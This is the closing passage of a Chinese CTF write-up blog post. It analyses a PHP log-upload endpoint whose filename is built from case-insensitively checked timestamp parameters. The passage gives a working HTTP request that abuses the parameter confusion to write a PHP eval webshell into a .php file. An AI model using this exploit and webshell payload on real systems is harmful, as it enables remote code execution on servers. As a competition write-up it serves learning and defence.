</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;缺少参数：&#34;</span> <span class=o>.</span> <span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;, &#39;</span><span class=p>,</span> <span class=nv>$missing</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$extra</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;含有多余参数：&#34;</span> <span class=o>.</span> <span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;, &#39;</span><span class=p>,</span> <span class=nv>$extra</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$foundKeys</span> <span class=o>!==</span> <span class=nv>$expectedOrder</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;参数顺序错误，应为：&#34;</span> <span class=o>.</span> <span class=nx>implode</span><span class=p>(</span><span class=s1>&#39; → &#39;</span><span class=p>,</span> <span class=nv>$expectedOrder</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;。当前为：&#34;</span> <span class=o>.</span> <span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;, &#39;</span><span class=p>,</span> <span class=nv>$foundKeys</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$expectedOrder</span> <span class=k>as</span> <span class=nv>$k</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$values</span><span class=p>[</span><span class=nv>$k</span><span class=p>])</span> <span class=o>||</span> <span class=o>!</span><span class=nx>ctype_digit</span><span class=p>(</span><span class=nv>$values</span><span class=p>[</span><span class=nv>$k</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;参数 </span><span class=si>{</span><span class=nv>$k</span><span class=si>}</span><span class=s2> 必须为纯数字，当前为：&#34;</span> <span class=o>.</span> <span class=p>(</span><span class=nv>$values</span><span class=p>[</span><span class=nv>$k</span><span class=p>]</span> <span class=o>??</span> <span class=s1>&#39;未提供&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$content</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>]</span> <span class=o>??</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>trim</span><span class=p>(</span><span class=nv>$content</span><span class=p>)</span> <span class=o>===</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;未检测到 POST 内容（content）。&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$dir</span> <span class=o>=</span> <span class=nx>DIR</span> <span class=o>.</span> <span class=s1>&#39;/upload&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_dir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>))</span> <span class=nx>mkdir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>,</span> <span class=mo>0777</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$year</span>  <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;timestamp&#39;</span><span class=p>][</span><span class=s1>&#39;year&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$month</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;timestamp&#39;</span><span class=p>][</span><span class=s1>&#39;month&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$day</span>   <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;timestamp&#39;</span><span class=p>][</span><span class=s1>&#39;day&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$filename</span> <span class=o>=</span> <span class=nv>$dir</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nv>$year</span><span class=o>.</span><span class=nv>$month</span><span class=o>.</span><span class=nv>$day</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=nv>$content</span> <span class=o>.</span> <span class=nx>PHP_EOL</span><span class=p>,</span> <span class=nx>FILE_APPEND</span> <span class=o>|</span> <span class=nx>LOCK_EX</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;写入文件失败&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;日志保存成功&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>看到最后进行参数拼接组合成文件，写入 webshell，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$params</span> <span class=k>as</span> <span class=nv>$param</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nv>$parts</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;=&#39;</span><span class=p>,</span> <span class=nv>$param</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nv>$key</span> <span class=o>=</span> <span class=nx>urldecode</span><span class=p>(</span><span class=nv>$parts</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=nv>$value</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$parts</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>?</span> <span class=nx>urldecode</span><span class=p>(</span><span class=nv>$parts</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>:</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^timestamp[[a-zA-Z]+]$/&#39;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$key</span><span class=p>,</span> <span class=nv>$foundKeys</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nv>$duplicates</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nv>$foundKeys</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$values</span><span class=p>[</span><span class=nv>$key</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>没有匹配大小写，所以可以参数混淆构造恶意文件名，本地测试下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>php -S localhost:8000
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/qwb-2025/16.png width=1602 height=790 loading=lazy alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api.php?timestamp[year]=2025&amp;timestamp[month]=10&amp;timestamp[day]=20&amp;Timestamp[day]=20&amp;timestamp[day]]=.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>localhost:8000</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US;q=0.9,en;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>content=&lt;?php @eval($_POST[1]);phpinfo();?&gt;
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/qwb-2025/17.png width=1596 height=846 loading=lazy alt=img></p><p>后面还需要后渗透，https://xz.aliyun.com/news/10748</p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a>
<a href=/tags/go/>Go</a>
<a href=/tags/java/>Java</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>